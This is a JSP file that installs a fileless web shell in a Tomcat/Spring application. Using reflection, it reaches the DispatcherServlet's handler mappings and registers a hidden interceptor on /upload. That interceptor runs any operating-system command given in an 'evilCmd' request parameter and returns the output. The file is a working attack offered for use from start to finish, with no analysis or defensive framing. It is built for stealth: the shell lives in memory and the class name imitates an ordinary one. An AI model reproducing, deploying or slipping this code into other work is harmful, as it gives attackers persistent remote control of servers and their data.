<%@ page import="org.springframework.web.servlet.HandlerInterceptor" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping" %>
<%@ page import="org.springframework.web.servlet.handler.AbstractHandlerMapping" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.springframework.web.servlet.handler.MappedInterceptor" %>
<%@ page import="org.springframework.web.servlet.DispatcherServlet" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.core.*" %>

<%
     class EviIInterceptor implements HandlerInterceptor {
        @Override
        public boolean preHandle(HttpServletRequest req, HttpServletResponse resp, Object handler) throws IOException {
            // this method is called before the request is handled by a controller
            String cmd = req.getParameter("evilCmd");
            if (cmd != null) {
                byte[] result = Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes();
                PrintWriter output = resp.getWriter();
                output.write(new String(result));
                output.flush();
                output.close(); // avoid being ovw by the controller
            }

            return true;
        }
    }

    if (request.getParameter("inject") != null) {
        try {
            // request field is of RequestFacade type
            ApplicationContextFacade context = (ApplicationContextFacade) request.getServletContext();

            ApplicationServletRegistration dispatcher = (ApplicationServletRegistration) context.getServletRegistration("dispatcher");
            Field dispatcherField = ApplicationServletRegistration.class.getDeclaredField("wrapper");
            dispatcherField.setAccessible(true);
            Wrapper wrapper = (Wrapper) dispatcherField.get(dispatcher);
            DispatcherServlet handleServlet = (DispatcherServlet) wrapper.getServlet();

            Field handlerMappingsField = DispatcherServlet.class.getDeclaredField("handlerMappings");
            handlerMappingsField.setAccessible(true);
            ArrayList<?> handlerMappings = (ArrayList<?>) handlerMappingsField.get(handleServlet);
            // get first handler mapping and check if it is an instance of RequestMappingHandlerMapping
            RequestMappingHandlerMapping mapping = (RequestMappingHandlerMapping) handlerMappings.get(0);

            Field adaptedInterceptors = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            adaptedInterceptors.setAccessible(true);
            ArrayList<MappedInterceptor> interceptors = (ArrayList<MappedInterceptor>) adaptedInterceptors.get(mapping);

            String[] includePatterns = {"/upload"};
            HandlerInterceptor interceptor = new EviIInterceptor();

            MappedInterceptor mappedInterceptor = new MappedInterceptor(includePatterns, interceptor);
            interceptors.add(mappedInterceptor);

            response.getWriter().println("Shell injected successfully!");
        } catch (Exception e) {
//            response.getWriter().println("Error injecting shell: " + e.getMessage());
            e.printStackTrace(response.getWriter());
        }
    }
%>